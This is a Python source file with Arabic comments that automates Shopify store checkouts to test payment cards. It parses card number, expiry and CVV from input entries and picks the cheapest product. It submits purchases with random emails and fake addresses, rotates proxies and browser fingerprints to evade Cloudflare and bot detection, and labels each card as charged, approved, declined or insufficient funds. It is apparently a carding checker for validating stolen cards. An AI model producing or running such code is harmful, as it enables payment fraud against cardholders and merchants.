# auto_async.py - النسخة الكاملة المعدلة للتناسق مع auto.py

from __future__ import annotations

import asyncio
import json
import re
import html
import random
import urllib.parse
import time as _time_mod
import os

from curl_cffi.requests import AsyncSession

import importlib.util
from pathlib import Path

_here = Path(__file__).resolve().parent
_auto_path = _here / "auto.py"
if not _auto_path.is_file():
    _auto_path = _here.parent / "auto.py"
_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
_auto = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
_spec.loader.exec_module(_auto)

CheckStatus = _auto.CheckStatus
CheckResult = _auto.CheckResult
Address = _auto.Address
BROWSER_PROFILES = _auto.BROWSER_PROFILES
USER_AGENTS = _auto.USER_AGENTS
generate_random_email = _auto.generate_random_email
address_for_country = _auto.address_for_country
parse_card_entry = _auto.parse_card_entry
normalize_proxy = _auto.normalize_proxy
extract_stable_id = _auto.extract_stable_id
extract_commit_sha = _auto.extract_commit_sha
extract_source_token = _auto.extract_source_token
extract_private_access_token_id = _auto.extract_private_access_token_id
extract_actions_js_url = _auto.extract_actions_js_url
extract_proposal_id = _auto.extract_proposal_id
extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
extract_queue_token = _auto.extract_queue_token
extract_seller_currency = _auto.extract_seller_currency
extract_seller_country = _auto.extract_seller_country
extract_seller_merchandise_price = _auto.extract_seller_merchandise_price
extract_is_shipping_required = _auto.extract_is_shipping_required
extract_delivery_handle = _auto.extract_delivery_handle
extract_signed_handles = _auto.extract_signed_handles
extract_shipping_amount = _auto.extract_shipping_amount
extract_checkout_total = _auto.extract_checkout_total
extract_seller_total = _auto.extract_seller_total
extract_running_total = _auto.extract_running_total
extract_tax_amount = _auto.extract_tax_amount
extract_identification_signature = _auto.extract_identification_signature
extract_pci_session_id = _auto.extract_pci_session_id
extract_receipt_id = _auto.extract_receipt_id
extract_receipt_session_token = _auto.extract_receipt_session_token
extract_receipt_status_code = _auto.extract_receipt_status_code
extract_any_error = _auto.extract_any_error
extract_tax_from_rejected = _auto.extract_tax_from_rejected
extract_total_from_rejected = _auto.extract_total_from_rejected
_proposal_headers = _auto._proposal_headers
patch_payload = _auto.patch_payload
check_submit_errors = _auto.check_submit_errors
generate_attempt_token = _auto.generate_attempt_token
generate_page_id = _auto.generate_page_id

# ===== إعدادات الأسعار =====
MIN_PRODUCT_PRICE = 0.50
MAX_PRODUCT_PRICE = 30.0

class AsyncTLSClient:
    def __init__(self, timeout=5, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url
        self.impersonate = impersonate or random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
        self.user_agent = user_agent or random.choice(USER_AGENTS)
        self._session: AsyncSession | None = None

    def _make_session(self) -> AsyncSession:
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update({
            'User-Agent': self.user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        await asyncio.sleep(random.uniform(0.01, 0.03))
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        await asyncio.sleep(random.uniform(0.01, 0.03))
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None

def _is_cf_body(body: str) -> bool:
    lo = body.lower()
    return "1003" in body or "cloudflare" in lo or "cf_managed_challenge" in lo or "challenge" in lo

# ===== البحث عن المنتج باستخدام auto.py =====
async def find_cheapest_product_async(client: AsyncTLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
    from auto import find_cheapest_product as sync_find
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_find(client, shop_url, min_price, max_price)
    )
    return result

_PAGE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
}

async def add_to_cart_and_checkout_async(client: AsyncTLSClient, shop_url: str, variant_id: str, product_id: str, product_handle: str):
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = await client.get(cart_permalink, allow_redirects=True, headers={
        **_PAGE_HEADERS,
        "user-agent": client.user_agent,
        "referer": shop_url + "/",
        "sec-fetch-site": "same-origin",
    })
    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    return checkout_url, checkout_token, session_token, checkout_html

async def fetch_private_access_token_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

async def fetch_actions_js_async(client: AsyncTLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

# ===== استيراد الدوال من auto.py =====
from auto import (
    send_proposal,
    send_proposal2,
    send_proposal3,
    send_poll_for_receipt,
    send_submit_for_completion,
    send_pci_session,
)

# ===== الدالة الرئيسية =====
async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "", max_price: float = 30.0) -> CheckResult:
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name, currency=currency, status=CheckStatus.ERROR)
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    email = generate_random_email()
    impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
    user_agent = random.choice(USER_AGENTS)
    client = AsyncTLSClient(timeout=5, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
    
    try:
        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product_async(
                client, shop_url,
                min_price=0.50,
                max_price=max_price
            )
            _ = title
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = await add_to_cart_and_checkout_async(client, shop_url, variant_id, product_id, product_handle)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            await fetch_private_access_token_async(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = await fetch_actions_js_async(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            _, proposal_body = await send_proposal_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, proposal_id, build_id, source_token, currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price:
                    price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        try:
            _, proposal2_body = await send_proposal2_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, proposal_id, build_id, source_token, queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        try:
            addr = address_for_country(country)
            _, proposal3_body = await send_proposal3_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, proposal_id, build_id, source_token, queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            _, proposal4_body = await send_proposal3_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, proposal_id, build_id, source_token, queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            proposal5_status, proposal5_body = await send_proposal3_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, proposal_id, build_id, source_token, queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            pci_status, pci_body = await send_pci_session_async(ident_sig, card_number, f"{addr.first_name} {addr.last_name}", card_month, card_year, card_cvv, site_name, proxy_url)
            _ = pci_status
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception("could not extract session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")
            is_digital = not extract_is_shipping_required(proposal5_body)
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")
            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract signedHandles")
            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"
            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount
            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount

            for tax_attempt in range(1, 2):
                submit_status, submit_body = await send_submit_for_completion_async(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email, addr, delivery_handle, shipping_amount, current_total, pci_session_id, attempt_token, currency, country, signed_handles, is_digital=is_digital, tax_amount=current_tax)
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    continue
                break

            _ = submit_status
            check_submit_errors(submit_status, submit_body)
            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result
            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result

        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 5):
            try:
                _, poll_body = await send_poll_for_receipt_async(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token)
                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)
                result.status_code = extract_receipt_status_code(poll_body, receipt_type)
                
                try:
                    poll_json = json.loads(poll_body)
                    receipt_obj = poll_json.get("data", {}).get("receipt", {})
                    conf_url = receipt_obj.get("confirmationPage", {}).get("url", "")
                    result.receipt_url = conf_url or checkout_url + "/thank_you"
                except Exception:
                    result.receipt_url = checkout_url + "/thank_you"
                
                if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    return result
                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result
                if receipt_type == "FailedReceipt":
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    em = error_re.search(poll_body)
                    error_code = em.group(1) if em else ""
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR"):
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                        else:
                            result.status = CheckStatus.DECLINED
                            result.error = Exception(error_code)
                    return result
                delay = 50
                m2 = poll_delay_re.search(poll_body)
                if m2:
                    try:
                        d = int(m2.group(1))
                        if d > 0:
                            delay = min(d, 50)
                    except ValueError:
                        pass
                await asyncio.sleep(min(delay, 50) / 1000.0)
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.error = Exception("exceeded 5 poll attempts")
        return result
    finally:
        await client.close()

# ===== دوال Async التي تستخدم run_in_executor =====

async def send_proposal_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str):
    from auto import send_proposal as sync_send_proposal
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_proposal(
            client, shop_url, checkout_url, checkout_token, session_token,
            stable_id, variant_id, price, proposal_id, build_id, source_token,
            currency, country
        )
    )
    return result

async def send_proposal2_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str):
    from auto import send_proposal2 as sync_send_proposal2
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_proposal2(
            client, shop_url, checkout_url, checkout_token, session_token,
            stable_id, variant_id, price, proposal_id, build_id, source_token,
            queue_token, email, currency, country
        )
    )
    return result

async def send_proposal3_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str):
    from auto import send_proposal3 as sync_send_proposal3
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_proposal3(
            client, shop_url, checkout_url, checkout_token, session_token,
            stable_id, variant_id, price, proposal_id, build_id, source_token,
            queue_token, email, addr, currency, country
        )
    )
    return result

async def send_poll_for_receipt_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str):
    from auto import send_poll_for_receipt as sync_send_poll_for_receipt
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_poll_for_receipt(
            client, shop_url, checkout_url, checkout_token, session_token,
            build_id, source_token, poll_id, receipt_id, receipt_session_token
        )
    )
    return result

async def send_submit_for_completion_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               tax_amount: str = None):
    from auto import send_submit_for_completion as sync_send_submit_for_completion
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_submit_for_completion(
            client, shop_url, checkout_url, checkout_token, session_token,
            stable_id, variant_id, price, submit_id, build_id, source_token,
            queue_token, email, addr, delivery_handle, shipping_amount,
            total_amount, pci_session_id, attempt_token, currency, country,
            signed_handles, is_digital, tax_amount
        )
    )
    return result

async def send_pci_session_async(ident_sig: str, card_number: str, card_name: str, card_month: int, card_year: int, cvv: str, shop_domain: str, proxy_url: str = ""):
    from auto import send_pci_session as sync_send_pci_session
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        lambda: sync_send_pci_session(
            ident_sig, card_number, card_name, card_month, card_year, cvv, shop_domain, proxy_url
        )
    )
    return result
